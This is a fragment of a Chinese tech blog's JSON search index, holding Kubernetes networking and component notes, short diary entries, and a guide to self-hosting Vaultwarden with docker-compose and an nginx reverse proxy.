","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:10:2","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#本地容器网络"},{"categories":["blog"],"content":" 本地容器网络 网络模型docker 默认网络模型： ifconfig 命令可以看到 docker0 和 veth73abaa8 这样的 docker0 是一个二层网络设备，即网桥 通过网桥可以将 Linux 支持的不同的端口连接起来 实现类交换机多对多的通信 veth pair 虚拟以太网（Ethernet）设备 成对出现,用于解决网络命名空间之间的隔离 一端连接 Container network namespace，另一端连接 host network namespace 所有网络模型 默认 --network bridge Bridge 桥接子网络 --network host 共享宿主机网络接口 --network none 仅本机 lo 通信 --network container:c1(容器名称或容器 ID) 并不是一种类型，而是加入目标相同的网络 docker network ls 查看已有的网络模型， docker network inspect minikube 查看 minikube 网络细节 外部通信容器访问外网: 外网访问容器: ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:10:2","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#网络模型"},{"categories":["blog"],"content":" 本地容器网络 网络模型docker 默认网络模型： ifconfig 命令可以看到 docker0 和 veth73abaa8 这样的 docker0 是一个二层网络设备，即网桥 通过网桥可以将 Linux 支持的不同的端口连接起来 实现类交换机多对多的通信 veth pair 虚拟以太网（Ethernet）设备 成对出现,用于解决网络命名空间之间的隔离 一端连接 Container network namespace，另一端连接 host network namespace 所有网络模型 默认 --network bridge Bridge 桥接子网络 --network host 共享宿主机网络接口 --network none 仅本机 lo 通信 --network container:c1(容器名称或容器 ID) 并不是一种类型，而是加入目标相同的网络 docker network ls 查看已有的网络模型， docker network inspect minikube 查看 minikube 网络细节 外部通信容器访问外网: 外网访问容器: ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:10:2","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#外部通信"},{"categories":["blog"],"content":" 跨主机网络 所有方案docker 原生方案 overlay 基于 VXLAN 封装实现 Docker 原生 overlay 网络 macvlan Docker 主机网卡接口逻辑上分为多个子接口，每个子接口标识一个 VLAN，容器接口直接连接 Docker Host 网卡接口 通过路由策略转发到另一台 Docker Host 第三方方案 Flannel 支持 UDP 和 VLAN 封装传输方式 Weave 支持 UDP 和 VXLAN OpenvSwitch 支持 VXLAN 和 GRE 协议 Calico 支持 BGP 协议和 IPIP 隧道 每台宿主机作为虚拟路由，通过 BGP 协议实现不同主机容器间通信。 k8s 的 CNI 方案有 3 种，主要用 flannel 和 calico。他们 2 个都支持 3 种。 flannel 是普遍使用。小规模 calico 主打网络策略。限制策略。大规模性能更好 方案选择： Flanneldocker 容器无法跨主机通信, Flannel 分配子网网段, 然后记录在 etcd 中实现通信. 安装也不难。安装并启动 etcd 以后设置一个 key，flannel 配置文件加入这个 key，配置好并启动。可以参考这里 搭建Flannel 数据从源容器中发出后，经由所在主机的 docker0 虚拟网卡转发到 flannel0 虚拟网卡，这是个 P2P 的虚拟网卡，flanneld 服务监听在网卡的另外一端。 Flannel 通过 Etcd 服务维护了一张节点间的路由表，该张表里保存了各个节点主机的子网网段信息。 源主机的 flanneld 服务将原本的数据内容 UDP 封装后根据自己的路由表投递给目的节点的 flanneld 服务，数据到达以后被解包，然后直接进入目的节点的 flannel0 虚拟网卡，然后被转发到目的主机的 docker0 虚拟网卡，最后就像本机容器通信一样的由 docker0 路由到达目标容器。 k8s 中的 flannel： 相关命令： 查看 svc 模式 cat kube-flannel.yml 查看 Vxlan 数据包流转 ip route list | grep flannel 路由表关系 ip neigh | grep flannel 数据包转发关系 bridge fdb show flannel.1 |grep flannel.1 隧道转发关系 说明：ip neigh | grep flannel 看到对应 ip 网段转发的网卡，在 bridge fdb show flannel.1 |grep flannel.1 找到对应的网卡和主机 ip 对应规则。ifconfig 中的 vethxxxx 就是 pod 内的网卡地址 calico","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:10:3","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#跨主机网络"},{"categories":["blog"],"content":" 跨主机网络 所有方案docker 原生方案 overlay 基于 VXLAN 封装实现 Docker 原生 overlay 网络 macvlan Docker 主机网卡接口逻辑上分为多个子接口，每个子接口标识一个 VLAN，容器接口直接连接 Docker Host 网卡接口 通过路由策略转发到另一台 Docker Host 第三方方案 Flannel 支持 UDP 和 VLAN 封装传输方式 Weave 支持 UDP 和 VXLAN OpenvSwitch 支持 VXLAN 和 GRE 协议 Calico 支持 BGP 协议和 IPIP 隧道 每台宿主机作为虚拟路由，通过 BGP 协议实现不同主机容器间通信。 k8s 的 CNI 方案有 3 种，主要用 flannel 和 calico。他们 2 个都支持 3 种。 flannel 是普遍使用。小规模 calico 主打网络策略。限制策略。大规模性能更好 方案选择： Flanneldocker 容器无法跨主机通信, Flannel 分配子网网段, 然后记录在 etcd 中实现通信. 安装也不难。安装并启动 etcd 以后设置一个 key，flannel 配置文件加入这个 key，配置好并启动。可以参考这里 搭建Flannel 数据从源容器中发出后，经由所在主机的 docker0 虚拟网卡转发到 flannel0 虚拟网卡，这是个 P2P 的虚拟网卡，flanneld 服务监听在网卡的另外一端。 Flannel 通过 Etcd 服务维护了一张节点间的路由表，该张表里保存了各个节点主机的子网网段信息。 源主机的 flanneld 服务将原本的数据内容 UDP 封装后根据自己的路由表投递给目的节点的 flanneld 服务，数据到达以后被解包，然后直接进入目的节点的 flannel0 虚拟网卡，然后被转发到目的主机的 docker0 虚拟网卡，最后就像本机容器通信一样的由 docker0 路由到达目标容器。 k8s 中的 flannel： 相关命令： 查看 svc 模式 cat kube-flannel.yml 查看 Vxlan 数据包流转 ip route list | grep flannel 路由表关系 ip neigh | grep flannel 数据包转发关系 bridge fdb show flannel.1 |grep flannel.1 隧道转发关系 说明：ip neigh | grep flannel 看到对应 ip 网段转发的网卡，在 bridge fdb show flannel.1 |grep flannel.1 找到对应的网卡和主机 ip 对应规则。ifconfig 中的 vethxxxx 就是 pod 内的网卡地址 calico","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:10:3","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#所有方案"},{"categories":["blog"],"content":" 跨主机网络 所有方案docker 原生方案 overlay 基于 VXLAN 封装实现 Docker 原生 overlay 网络 macvlan Docker 主机网卡接口逻辑上分为多个子接口，每个子接口标识一个 VLAN，容器接口直接连接 Docker Host 网卡接口 通过路由策略转发到另一台 Docker Host 第三方方案 Flannel 支持 UDP 和 VLAN 封装传输方式 Weave 支持 UDP 和 VXLAN OpenvSwitch 支持 VXLAN 和 GRE 协议 Calico 支持 BGP 协议和 IPIP 隧道 每台宿主机作为虚拟路由，通过 BGP 协议实现不同主机容器间通信。 k8s 的 CNI 方案有 3 种，主要用 flannel 和 calico。他们 2 个都支持 3 种。 flannel 是普遍使用。小规模 calico 主打网络策略。限制策略。大规模性能更好 方案选择： Flanneldocker 容器无法跨主机通信, Flannel 分配子网网段, 然后记录在 etcd 中实现通信. 安装也不难。安装并启动 etcd 以后设置一个 key，flannel 配置文件加入这个 key，配置好并启动。可以参考这里 搭建Flannel 数据从源容器中发出后，经由所在主机的 docker0 虚拟网卡转发到 flannel0 虚拟网卡，这是个 P2P 的虚拟网卡，flanneld 服务监听在网卡的另外一端。 Flannel 通过 Etcd 服务维护了一张节点间的路由表，该张表里保存了各个节点主机的子网网段信息。 源主机的 flanneld 服务将原本的数据内容 UDP 封装后根据自己的路由表投递给目的节点的 flanneld 服务，数据到达以后被解包，然后直接进入目的节点的 flannel0 虚拟网卡，然后被转发到目的主机的 docker0 虚拟网卡，最后就像本机容器通信一样的由 docker0 路由到达目标容器。 k8s 中的 flannel： 相关命令： 查看 svc 模式 cat kube-flannel.yml 查看 Vxlan 数据包流转 ip route list | grep flannel 路由表关系 ip neigh | grep flannel 数据包转发关系 bridge fdb show flannel.1 |grep flannel.1 隧道转发关系 说明：ip neigh | grep flannel 看到对应 ip 网段转发的网卡，在 bridge fdb show flannel.1 |grep flannel.1 找到对应的网卡和主机 ip 对应规则。ifconfig 中的 vethxxxx 就是 pod 内的网卡地址 calico","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:10:3","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#flannel"},{"categories":["blog"],"content":" 跨主机网络 所有方案docker 原生方案 overlay 基于 VXLAN 封装实现 Docker 原生 overlay 网络 macvlan Docker 主机网卡接口逻辑上分为多个子接口，每个子接口标识一个 VLAN，容器接口直接连接 Docker Host 网卡接口 通过路由策略转发到另一台 Docker Host 第三方方案 Flannel 支持 UDP 和 VLAN 封装传输方式 Weave 支持 UDP 和 VXLAN OpenvSwitch 支持 VXLAN 和 GRE 协议 Calico 支持 BGP 协议和 IPIP 隧道 每台宿主机作为虚拟路由，通过 BGP 协议实现不同主机容器间通信。 k8s 的 CNI 方案有 3 种，主要用 flannel 和 calico。他们 2 个都支持 3 种。 flannel 是普遍使用。小规模 calico 主打网络策略。限制策略。大规模性能更好 方案选择： Flanneldocker 容器无法跨主机通信, Flannel 分配子网网段, 然后记录在 etcd 中实现通信. 安装也不难。安装并启动 etcd 以后设置一个 key，flannel 配置文件加入这个 key，配置好并启动。可以参考这里 搭建Flannel 数据从源容器中发出后，经由所在主机的 docker0 虚拟网卡转发到 flannel0 虚拟网卡，这是个 P2P 的虚拟网卡，flanneld 服务监听在网卡的另外一端。 Flannel 通过 Etcd 服务维护了一张节点间的路由表，该张表里保存了各个节点主机的子网网段信息。 源主机的 flanneld 服务将原本的数据内容 UDP 封装后根据自己的路由表投递给目的节点的 flanneld 服务，数据到达以后被解包，然后直接进入目的节点的 flannel0 虚拟网卡，然后被转发到目的主机的 docker0 虚拟网卡，最后就像本机容器通信一样的由 docker0 路由到达目标容器。 k8s 中的 flannel： 相关命令： 查看 svc 模式 cat kube-flannel.yml 查看 Vxlan 数据包流转 ip route list | grep flannel 路由表关系 ip neigh | grep flannel 数据包转发关系 bridge fdb show flannel.1 |grep flannel.1 隧道转发关系 说明：ip neigh | grep flannel 看到对应 ip 网段转发的网卡，在 bridge fdb show flannel.1 |grep flannel.1 找到对应的网卡和主机 ip 对应规则。ifconfig 中的 vethxxxx 就是 pod 内的网卡地址 calico","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:10:3","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#calico"},{"categories":["blog"],"content":" ingress","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:11:0","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#ingress"},{"categories":["blog"],"content":" 流量方案对比 ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:11:1","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#流量方案对比"},{"categories":["blog"],"content":" externaltrafficpolicy cluster：跨节点转发，负载更好。但多了一次 snat。获取源 ip 可能会有问题，性能差一点。并且会让上层的负载均衡权重失效。 local：永远不会跨节点转发。不丢失源 ip。性能好一点。如果 3 个节点，但是只有 2 个 nginx 提供服务，会导致 node3 无法转发。如果发版切换到了 node3，上层负载均衡无法感知。需要控制器 Cloud Controller Management（简称：CCM） 感应 endpoint 变化。通知给 ELB。ELB 其实就是 load-balance。 云厂商就是用的 local 模式 + load-balance 。负载均衡和权重在外部做了，可以跨节点转发，又不会失去源 ip。云厂商自己也有配套的 CCE 阿里云 使用Service对外暴露应用 自建K8s集群如何部署CCM组件 ccm 的开源地址 其他相关资料 externalTrafficPolicy为Local的服务重启时如何保证zero downtime - 知乎 参考 externaltrafficpolicy的有关问题说明 - 紫色飞猪 - 博客园 #todo/笔记 自己搭建一个测试? ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:11:2","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#externaltrafficpolicy"},{"categories":["blog"],"content":" deployment 控制器 判断是否是新的版本，选择更新 replicaset 或者整个 deployment 资源 更新会保存到到 etcd 由 scheduler 进行调度分配 kubelet 进行 watch，执行具体的调整动作 如果调整整个 deployment 资源，那么会新建一个 replicas 来替换。回滚也是一样 ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:12:0","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#deployment-控制器"},{"categories":["blog"],"content":" Pod","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:13:0","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#pod-1"},{"categories":["blog"],"content":" pod 详解 顺序启动 2 个容器。一个是 init 容器，然后是程序容器 程序容器中有一个 infra 或者说 pause 容器 因为容器被 linux namespace 和 cgroups 隔离，所以让容器都加入 infra 的网络空间。所以 mac 地址，ip，网络设备都是一样的。 pause 启用 pid 命名空间，开启 init 进程。比 init 容器更早创建出来 启动失败：back-off delay (10 s, 20 s, 40 s, …)，最长 5 分钟。一旦启动成功了 10 分钟，就会重置 delay 时间 Pause 容器 · Kubernetes 中文指南——云原生应用架构实战手册 ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:13:1","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#pod-详解"},{"categories":["blog"],"content":" 设计模式 sidecar作用: 可以收集日志。docker 应用写入到 volume，然后通过 initContainer 来收集日志。 访问外部集群的时候，通过它可以进行一个反向代理。这样就不需要修改容器代码。访问一个地址即可实现。例如 zk，我们是一个集群。通过一个统一的 proxy 代理，即可让所有 docker 复用这一配置。 适配器。可以做到类似 nginx 的 rewrite 域名转发。访问/a 的时候请求转到应用 docker 的/b 路径。 ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:13:2","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#设计模式-sidecar"},{"categories":["blog"],"content":" stateful 有状态应用 通过 mysql 的实例学习 运行一个有状态的应用程序 | Kubernetes ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:14:0","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#stateful-有状态应用"},{"categories":["blog"],"content":" service 控制器 service 创建后，创建一个同名 endpoint endpoint controller 筛选符合的 pod，绑定到 endpoint 对象 service 通过 cluster-ip 对外提供 endpoint 内的信息 ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:15:0","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#service-控制器"},{"categories":["blog"],"content":" k8s 配置管理 ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:16:0","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#k8s-配置管理"},{"categories":["blog"],"content":" 存储","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:17:0","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#存储"},{"categories":["blog"],"content":" 存储挂载 同个 volumn 或者多个 volumn 都可以按照下面的方式挂在到不同路径 mountPath 是主机路径 subPath 是 volumn 路径。避免每个 volumn 的路径/文件名重复造成的冲突 apiVersion: v1 kind: Pod metadata: name: my-pod spec: containers: - name: my-container image: my-image volumeMounts: - name: my-volume mountPath: /data/data1 subPath: data1/file.txt - name: my-volume mountPath: /data/data2 subPath: data2/file.txt volumes: - name: my-volume persistentVolumeClaim: name: my-pvc ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:17:1","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#存储挂载"},{"categories":["blog"],"content":" 存储方案如果不用第三方，不用 nfs 之类的。就用 ceph Gluster和Ceph对比 — Cloud Atlas beta 文档 ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:17:2","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#存储方案"},{"categories":["blog"],"content":" coredns 可以使用 nslookup 来解析 ip 或者域名 每个容器的 /etc/resolv.conf 都有 coredns 的配置信息 在初始化集群的时候，会有一个 dnsDoimain 是 cluster.local，所以 svc ，pod 等资源的结尾是 资源名称xxx-svc.命名空间default.资源类型svc.cluster.local ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:18:0","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#coredns"},{"categories":["blog"],"content":" 第三方组件","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:19:0","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#第三方组件"},{"categories":["blog"],"content":" 监控 cadvisor 监控容器的资源使用率，但是 k8s 已经内置了 google/cadvisor KSM 收集集群相关的内容，需要自己部署 kubernetes/kube-state-metrics: Add-on agent to generate and expose cluster-level metrics. 收集使用信息，计算成本 Kubecost Documentation ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:19:1","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#监控"},{"categories":["blog"],"content":" KEDA 缩放使用 crontab 的方式定时扩缩容 Cron | KEDA ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:19:2","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#keda-缩放"},{"categories":["journal"],"content":"2023-07-31 日记","date":"2023-07-31","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-31/","series":null,"tags":["journal"],"title":"2023-07-31","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-31/"},{"categories":["journal"],"content":"#lines 红帽公司的源码不再公开, 而是提供给付费用户. 其中客服模式行不通的原因: 利润其实很微薄, 并不稳定 很难扩展, 用户只会购买 1 份服务 软件越好用, 越不需要服务. 类似于 ai promt 工程师, 未来必然消失 早起起步很难 以太坊发明者 Vitalik Buterin 在创建以太坊之前，是一名记者，为比特币杂志撰稿。他（或者他的父亲）说，他们相信写作帮助他理清了思想。 网络社区最不能容忍的，就是大量持续涌入的陌生人，这让社区变成一个类似火车站的地方。成员的行为模式变得就像路过，人来人往，没有真正的归属感。 #fun JSLint 的许可证 JSON 格式的发明者道格拉斯（Douglas Crockford），在一次演讲中讲了一件趣事。 他在自己开发的 JSLint 软件许可证中设置了一个条款，要求 \" 该软件应该用于善，而不是恶 “。 后来，他收到一封来自 IBM 公司律师的信。 律师说，他们想使用 JSLint，但是这个许可证让他们有点为难。他们很确定，IBM 不会用它来作恶，但没法保证 IBM 客户的行为。因此询问道格拉斯，能不能给他们一个不同的许可证？ 道格拉斯回信：” 可以。我允许 IBM、它的客户、合作伙伴使用 JSLint 作恶。\" 律师回信说：\" 非常感谢，道格拉斯！\" 我们家的洗碗机经常坏，上一次是我自己修好的，这一次修不好了。 一连 10 天，我都用手洗碗。虽然我小时候就是这样做，但是洗碗机让我忘了，自己曾经多么讨厌这件事。好在新洗碗机终于到了。social.kernel.org Live Starlink Satellite and Coverage Map 这是星链的实时位置图 来源: 科技爱好者周刊（第 263 期）：开源软件如何赚钱？ - 阮一峰的网络日志 ","date":"2023-07-31","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-31/:0:0","series":null,"tags":["journal"],"title":"2023-07-31","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-31/#"},{"categories":["point"],"content":"bitwarden 是一款密码管理软件. 要点: 开源 Bitwarden · GitHub 大部分功能免费, 自建全免费 所有端的全覆盖 ","date":"2023-07-31","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/bitwarden/:0:0","series":null,"tags":["point","bitwarden"],"title":"bitwarden","uri":"/posts/%E7%AC%94%E8%AE%B0/point/bitwarden/#"},{"categories":["blog"],"content":" 简介这里是自建 bitwarden 的配置和记录. 为什么要自建? 完全免费, 不怕跑路 上传附件需要收费, 例如 ssh-key 自己使用 api 完成一些功能? 公共的可能有限制 我使用的是 vaultwarden, 这是服务端的 rust 版本, 更加省内存. ","date":"2023-07-31","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%87%AA%E5%BB%BAbitwarden/:1:0","series":null,"tags":["blog","bitwarden"],"title":"自建bitwarden","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%87%AA%E5%BB%BAbitwarden/#简介"},{"categories":["blog"],"content":" 内容","date":"2023-07-31","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%87%AA%E5%BB%BAbitwarden/:2:0","series":null,"tags":["blog","bitwarden"],"title":"自建bitwarden","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%87%AA%E5%BB%BAbitwarden/#内容"},{"categories":["blog"],"content":" 启动配置 命令 说明 SIGNUPS_ALLOWED=false 禁止注册 WEBSOCKET_ENABLED=true 启动 websocket ADMIN_TOKEN=123444 启动 amdmin 界面 初次启动进行初始化, 随后关闭 SIGNUPS_ALLOWED 和 ADMIN_TOKEN. # docker-compose.yml version: \"3\" services: server: container_name: bitwarden volumes: - \"/data/bitwarden/:/data/\" environment: - SIGNUPS_ALLOWED=true # false - WEBSOCKET_ENABLED=true - ADMIN_TOKEN=你的admin密码 # 注释这一行 ports: - \"6000:80\" - \"3012:3012\" restart: always image: \"vaultwarden/server:1.30.5\" # 启动 # docker compose up -d ","date":"2023-07-31","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%87%AA%E5%BB%BAbitwarden/:2:1","series":null,"tags":["blog","bitwarden"],"title":"自建bitwarden","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%87%AA%E5%BB%BAbitwarden/#启动配置"},{"categories":["blog"],"content":" 反向代理下面是 nginx 的代理配置 upstream vaultwarden-default { zone vaultwarden-default 64k; server 127.0.0.1:6000; keepalive 2; } server { http2 on; listen 443 ssl; server_name bit.kentxxq.com; ssl_certificate /etc/nginx/ssl/kentxxq.cer; ssl_certificate_key /etc/nginx/ssl/kentxxq.key; client_max_body_size 128M; location / { proxy_http_version 1.1; proxy_set_header \"Connection\" \"\"; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_pass http://vaultwarden-default; } } server { listen 80; server_name bit.kentxxq.com; return 301 https://$server_name$request_uri; } ","date":"2023-07-31","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%87%AA%E5%BB%BAbitwarden/:2:2","series":null,"tags":["blog","bitwarden"],"title":"自建bitwarden","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%87%AA%E5%BB%BAbitwarden/#反向代理"},{"categories":["journal"],"content":"2023-07-30 日记","date":"2023-07-30","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-30/","series":null,"tags":["journal"],"title":"2023-07-30","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-30/"},{"categories":["journal"],"content":"#fun 倔强的任天堂宁可面对摇杆漂移问题 也不用霍尔摇杆？_哔哩哔哩_bilibili 霍尔传感器 【何同学】 为了找到专注的秘诀，我们找500人做了个实验…_哔哩哔哩_bilibili #lines 听轻音乐 https://www.bilibili.com/video/BV1fu411G7e3/?vd_source=3f8a7a9cfa796e140d94e90eb3af4c90 减少切换, 例如手机 番茄工作法 25 分钟休息 5 分钟 减少压力, 快速行动 ","date":"2023-07-30","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-30/:0:0","series":null,"tags":["journal"],"title":"2023-07-30","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-30/#"},{"categories":["point"],"content":"Systemd 并不是一个单独的组件, 而是包括了系统管理相关的很多内容. 虽然日常都代指守护进程 systemd(开头小写) . 而 systemd 现在它是 linux 系统的默认守护进程, 第一个进程 (pid=1). 要点: linux 系统的事实标准 系统自带 主要包含 Systemd教程 包含 timedatectl 包含 hostnamectl ","date":"2023-07-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/systemd/:0:0","series":null,"tags":["point","Systemd"],"title":"Systemd","uri":"/posts/%E7%AC%94%E8%AE%B0/point/systemd/#"},{"categories":["blog"],"content":"[[笔记/point/Systemd|systemd]] 的相关概念, 使用, 操作示例.","date":"2023-07-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/","series":null,"tags":["blog","linux"],"title":"Systemd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/"},{"categories":["blog"],"content":" 简介systemd 的相关概念, 使用, 操作示例. ","date":"2023-07-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["blog","linux"],"title":"Systemd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 服务 Unit","date":"2023-07-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["blog","linux"],"title":"Systemd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/#服务-unit"},{"categories":["blog"],"content":" 